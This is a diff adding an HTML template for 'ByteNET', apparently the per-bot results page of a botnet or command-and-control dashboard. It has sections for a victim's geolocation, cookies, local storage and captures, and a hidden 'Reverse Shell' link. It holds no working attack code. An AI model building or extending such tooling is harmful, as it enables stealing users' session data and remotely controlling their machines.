@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bot {{botname}}</title>
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/results.css') }}">
+  </head>
+  <body>
+    <nav class="navbar">
+        <a class="navbar-item left" href="/dashboard" style="opacity: 0;">Back</a>
+        <a class="navbar-brand" href="/dashboard" style="opacity: 100%;">ByteNET</a>
+        <a class="navbar-item right" onclick="showTerminal();" style="opacity: 0;">Reverse Shell</a>
+      </nav>
+      <div class="section" id="geoloc-section">
+        <h2>Geolocation</h2>
+      </div>
+      <div class="section" id="cookies-section">
+        <h2>Cookies</h2>
+      </div>
+      <div class="section" id="localstorage-section">
+        <h2>Local Storage</h2>
+      </div>
+      <div class="section" id="capture-section">
+        <h2>Captures</h2>
+      </div>
+      <script>
+        const botname = "{{botname}}"
+      </script>
+      <script src="{{ url_for('static', filename='js/results.js') }}"></script>
+  </body>
+</html>
+
